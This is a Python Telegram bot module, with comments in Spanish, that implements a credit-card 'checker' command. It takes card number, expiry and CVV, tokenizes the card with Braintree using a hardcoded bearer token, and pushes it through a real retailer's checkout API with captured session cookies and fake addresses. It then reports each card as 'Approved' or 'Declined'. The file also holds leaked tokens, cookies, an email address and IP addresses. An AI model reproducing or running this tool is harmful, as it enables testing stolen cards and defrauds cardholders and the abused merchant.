import random

import hashlib

import json
import requests
import time
import asyncio
import os
import re
import colored 
from asyncio import sleep
from pyrogram import Client, filters
from pyrogram.types import (
    Message,
    InlineKeyboardButton,
    InlineKeyboardMarkup
) 

from pyrogram import Client, filters
from pyrogram.types import Message
from pyrogram.types import (
    Message,
    InlineKeyboardButton,
    InlineKeyboardMarkup
)
import mysql.connector


from db import *

from user import*

# Establece los detalles de la conexión


# Establece los detalles de la conexión
def multiexplode(delimiters, string):
    """
    Separa una cadena en elementos utilizando múltiples delimitadores.

    :param delimiters: Lista de delimitadores como cadena o lista.
    :param string: Cadena a ser dividida.
    :return: Lista de elementos separados.
    """
    if isinstance(delimiters, str):
        delimiters = [delimiters]

    # Reemplazar todos los delimitadores por el primer delimitador
    current_delimiter = delimiters[0]
    for delimiter in delimiters[1:]:
        string = string.replace(delimiter, current_delimiter)

    # Dividir la cadena utilizando el primer delimitador
    return string.split(current_delimiter)

@Client.on_message(filters.command(["jajahahahahaaay"], ["/", "."]))
async def ch(_, message: Message):


            data = message.text.split(" ", 2)

            if len(data) < 2:
                await message.reply_text("""
━━━━━「𝘼𝙯𝙪𝙣𝙖 𝘾𝙝𝙠」 ━━━━
<i>♻️ Comando</i> <i>/ay</i>
<i>🔰 Formato:</i> <code>cc|mm|yy|cvv</code>
<i>➤ Gateway:</i> <code>braintree </code>
━━━━━「𝘼𝙯𝙪𝙣𝙖 𝘾𝙝𝙠」 ━━━━""")
                return

            ccs = data[1]
            card = multiexplode([":", "|", "/", " ","!"], ccs)
            cc = card[0]
            mes = card[1]
            if len(cc) != 16:
                await message.reply_text("Card Not Found. La tarjeta debe tener 16 dígitos.")
                return
            if len(mes) != 2:
                await message.reply_text("Card Not Found. mes inválido")
                return
            
            # Verificar si el año tiene 2 o 4 dígitos
            regex_pattern = r"\b\d{2}\b|\b\d{4}\b"
            match = re.search(regex_pattern, card[2])
        
            if match:
                ano = match.group()  # Obtener el año coincidente
            else:
                await message.reply_text("Formato de año no válido.")
                return
            
            cvv = card[3]
            bin_code = cc[:6]
            
            if len(cvv) != 3:
                await message.reply_text("Card Not Found. cvv inválido")
                return
            
            # Verificar si el bin está en la lista de bins prohibidos
            banned_file = "bin_banned.txt"
            if os.path.exists(banned_file):
                with open(banned_file, "r") as file:
                    banned_bins = file.read().splitlines()
                if bin_code in banned_bins:
                    await message.reply_text("Bin Banned")
                    return
            
            # Continuar con el resto del código si el bin no está en la lista de bins prohibidos
            # ...

   #dabese variable
            
            username = message.from_user.username
    
            user_id = (
        message.from_user.id
    )
         
        
           

    
    
            
                
                # Ejecuta una consulta SQL para buscar al usuario por su User ID
            query = f"SELECT status FROM users WHERE user_id='{user_id}'"
            cursor.execute(query)
                 
            # Obtiene el resultado de la consulta
            result = cursor.fetchone()
            if result is None:
             await message.reply_text( "No estás registrado. Por favor, utiliza /register para registrarte.")
             return
                # Verifica el resultado y almacena el valor en la variable "rank"
            
            rank = result[0]
            if message.from_user.id in antispam_users and antispam_users[message.from_user.id] + 16 > int(time.time()):
             time_left = antispam_users[message.from_user.id] + 16 - int(time.time())
             await message.reply_text(f"❗️ [<i>ANTISPAM DETECTADO</i>]. Espera {time_left} segundos antes de enviar otro comando.")
             return 
            else:
             antispam_users[message.from_user.id] = int(time.time())

    # ... (el resto del código existente)
    # ... (el resto del código existente)

                
            inputm = message.text.split(None, 1)[1]
            bincode = 6
            BIN = inputm[:bincode]
            req = requests.get(f"https://bins.antipublic.cc/bins/{BIN}").json()
            reply = await message.reply_text("<b>Cargando proceso...</b>")        
                 
            
            brand = req['brand']
            country = req['country']
            country_name = req['country_name']
            country_flag = req['country_flag']
            country_currencies = req['country_currencies']
            bank = req['bank']
            level = req['level']
            typea  = req['type']
            tiempo_inicio = time.perf_counter()
            tiempo_fin = time.perf_counter()
            duracion = tiempo_fin - tiempo_inicio
            tiempo = round(duracion, 2)  # Redondear a 2 decimales
            zip_code = random.randint(10001, 90045)
            rand_num = random.randint(0, 99999)
            password = random.randint(0000000000, 9999999999)
            email = hashlib.md5(str(random.randint(0, 999999)).encode()).hexdigest()[:7]
            name = hashlib.md5(str(random.randint(0, 999999)).encode()).hexdigest()[:7]
           
            tiempo_fin = time.perf_counter()
            duracion = tiempo_fin - tiempo_inicio
            tiempo = round(duracion, 2)  # Redondear a 2 decimales
            await reply.edit_text(f"""
<code><i>Gateway ➤</i></code> <b>Stripe Auth</b>
<i><b>➜[Credit Card] »</b></i><code>{cc}|{mes}|{ano}|{cvv}</code>
<i><b>➜[Loading]...■■■□□□□□□□ →30%</b></i>
<i><b>➜[Time] » → {tiempo}</b></i>sg""")
  

   
    #-----------------------------------------------------------------------------------------------
            headers = {
    'Accept': '*/*',
    'Accept-Language': 'es-US,es-419;q=0.9,es;q=0.8',
    'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2OTA3OTY2MzYsImp0aSI6IjNmMDFkY2NmLTg0NzMtNDAxOC1hZDJmLWIyZTlkYmViYjY2OCIsInN1YiI6Inp2YmpiZ2M2NG5rOTM2cXYiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Inp2YmpiZ2M2NG5rOTM2cXYiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.O36AR5ziffQo06XqnCzAty1IrboQ60I1Q3N_tYoYt88ow6JhDPnu-8iA2tfT_SEbNwW15szyfq8xPQHYx4PFPA',
    'Braintree-Version': '2018-05-10',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
    'Origin': 'https://assets.braintreegateway.com',
    'Referer': 'https://assets.braintreegateway.com/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'cross-site',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-G990E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
}

            json_data = {
                'clientSdkMetadata': {
                    'source': 'client',
                    'integration': 'custom',
                    'sessionId': '352f19d8-c2b3-47ae-824c-a632aa3e9305',
                },
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': cc,
                            'expirationMonth': mes,
                            'expirationYear': ano,
                            'cvv': cvv,
                            'cardholderName': 'Ale ',
                        },
                        'options': {
                            'validate': False,
                        },
                    },
                },
                'operationName': 'TokenizeCreditCard',
            }
            
            response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data).json()
            

            token = response['data']['tokenizeCreditCard']['token'] 
            cookies = {
    '_clck': '15dvfa2|2|fdq|0|1306',
    '_gcl_au': '1.1.819400593.1690710186',
    '_gid': 'GA1.2.778053838.1690710186',
    'calltrk_referrer': 'https%3A//duckduckgo.com/',
    'calltrk_landing': 'https%3A//www.homelectrical.com/',
    'calltrk_session_id': '15dccf79-0e2e-4e2f-a045-ce6d9d6a688a',
    'order_id': '9263242',
    '_ga': 'GA1.2.437865065.1690710186',
    '_uetsid': '7c296c102ebd11ee91cad5cc5db5e0bc',
    '_uetvid': '7c2adf502ebd11ee9282e3a2df1d8de9',
    'G_ENABLED_IDPS': 'google',
    '_clsk': 'mocz7t|1690710236816|7|1|u.clarity.ms/collect',
    '_ga_JJLFXE7L31': 'GS1.1.1690710186.1.1.1690710334.34.0.0',
}

            headers = {
                'authority': 'www.homelectrical.com',
                'accept': '*/*',
                'accept-language': 'es-US,es-419;q=0.9,es;q=0.8',
                'content-type': 'application/json',
                # 'cookie': '_clck=15dvfa2|2|fdq|0|1306; _gcl_au=1.1.819400593.1690710186; _gid=GA1.2.778053838.1690710186; calltrk_referrer=https%3A//duckduckgo.com/; calltrk_landing=https%3A//www.homelectrical.com/; calltrk_session_id=15dccf79-0e2e-4e2f-a045-ce6d9d6a688a; order_id=9263242; _ga=GA1.2.437865065.1690710186; _uetsid=7c296c102ebd11ee91cad5cc5db5e0bc; _uetvid=7c2adf502ebd11ee9282e3a2df1d8de9; G_ENABLED_IDPS=google; _clsk=mocz7t|1690710236816|7|1|u.clarity.ms/collect; _ga_JJLFXE7L31=GS1.1.1690710186.1.1.1690710334.34.0.0',
                'origin': 'https://www.homelectrical.com',
                'referer': 'https://www.homelectrical.com/checkout/9263242?guest=frangelotorrez1%40gmail.com&userstate=false',
                'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G990E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
                'x-access-token': '',
            }
            
            json_data = {
                'checkout_start': 1690710236165,
                'checkout_end': 1690710334211,
                'payload': {
                    'nonce': 'tokencc_bc_rfbcnz_tvj6jj_fdwphp_j4fc7x_m74',
                    'details': {
                        'cardholderName': 'Ale ',
                        'expirationMonth': '06',
                        'expirationYear': '2026',
                        'bin': '498408',
                        'cardType': 'Visa',
                        'lastFour': '7170',
                        'lastTwo': '70',
                    },
                    'description': 'ending in 70',
                    'type': 'CreditCard',
                    'binData': {
                        'prepaid': 'No',
                        'healthcare': 'No',
                        'debit': 'No',
                        'durbinRegulated': 'No',
                        'commercial': 'No',
                        'payroll': 'No',
                        'issuingBank': 'Banco do Brasil S.A.',
                        'countryOfIssuance': 'BRA',
                        'productId': 'I',
                    },
                },
                'clientip': '181.209.195.99, 64.252.69.126',
                'order_id': '9263242',
                'order_mail': name+'@gmail.com',
                'paymentMethodNonce': token,
                'type': 'update_address',
                'g_response': '',
                'ccZipcode': '',
                'location': {},
                'shipping': {
                    'organisation_name': 'cedex',
                    'first_name': 'pene 2',
                    'last_name': 'pene3',
                    'thoroughfare': 'streetview ',
                    'city': 'SOUTHSEA',
                    'state': 'NY',
                    'country_code': 'US',
                    'postal_code': '10080',
                    'phone_number': '(414) 602-4799',
                    'commercial_address': 0,
                    'liftgate_service': 0,
                    'residential_service': 0,
                },
                'billing': {
                    'first_name': 'pene 2',
                    'last_name': 'pene3',
                    'thoroughfare': 'streetview ',
                    'city': 'LONDON',
                    'state': 'NY',
                    'country_code': 'US',
                    'postal_code': '10080',
                    'profile_copy_billing': False,
                },
            }
            
            response = requests.post(
                'https://www.homelectrical.com/api/braintree/save/order',
                cookies=cookies,
                headers=headers,
                json=json_data,
            ).json()
            errormessage=response['data']
               
            await reply.edit_text(f"""
<code><i>Gateway ➤</i></code> <b>Stripe Auth</b>
<i><b>➜[Credit Card] »</b></i><code>{cc}|{mes}|{ano}|{cvv}</code>
<i><b>➜[Loading]...■■■■■■■■■■→100%</b></i>
<i><b>➜[Time] » → {tiempo}</b></i>sg""") 
            
               
            if errormessage=='Card Issuer Declined CVV':
             await reply.edit_text(f"""   
<i>Card ➤</i> <code>{cc}|{mes}|{ano}|{cvv}</code>
<i>Status ➤</i> <b>Approved! ✅</b> 
<i>Message ➤</i><code> {errormessage}</code>
<i>Gateway ➤</i> Stripe Auth
━━━━━━━━━━━━
<i>Bin ➤</i> <code>{level} -  {type} [{country_flag}]</code>
<i>Bank ➤</i> <code>{bank}</code>
<i>Country ➤</i> <code>{country_name} - {country}</code>
━━━━━━━━━━━━
<i>Time ➤</i> <code>{tiempo}</code>sg
<i>User ➤</i> <i>{username}</i> [{rank}]
<i>Owner by ➤</i> <code>@Al3xCodex OR
@Angel70k</code>""")
            elif errormessage=='AVS and CVV':
              await reply.edit_text(f"""   
<i>Card ➤</i> <code>{cc}|{mes}|{ano}|{cvv}</code>
<i>Status ➤</i> <b>Approved! ✅</b> 
<i>Message ➤</i><code> {errormessage}</code>
<i>Gateway ➤</i> Stripe Auth
━━━━━━━━━━━━
<i>Bin ➤</i> <code>{level} -  {type} [{country_flag}]</code>
<i>Bank ➤</i> <code>{bank}</code>
<i>Country ➤</i> <code>{country_name} - {country}</code>
━━━━━━━━━━━━
<i>Time ➤</i> <code>{tiempo}</code>sg
<i>User ➤</i> <i>{username}</i> [{rank}]
<i>Owner by ➤</i> <code>@Al3xCodex OR
@Angel70k</code>""")
            else:
                await reply.edit_text(f"""
<i>Card ➤</i> <code>{cc}|{mes}|{ano}|{cvv}</code>
<i>Status ➤</i> <b>Declined! ❌</b> 
<i>Message ➤</i><code> {errormessage}</code>
<i>Gateway ➤</i> Stripe Auth
━━━━━━━━━━━━
<i>Bin ➤</i> <code>{level} -  {type} [{country_flag}]</code>
<i>Bank ➤</i> <code>{bank}</code>
<i>Country ➤</i> <code>{country_name} - {country}</code>
━━━━━━━━━━━━
<i>Time ➤</i> <code>{tiempo}</code>sg
<i>User ➤</i> <i>{username}</i> [{rank}]
<i>Owner by ➤</i> <code>@Al3xCodex OR
@Angel70k</code>""")
            

            

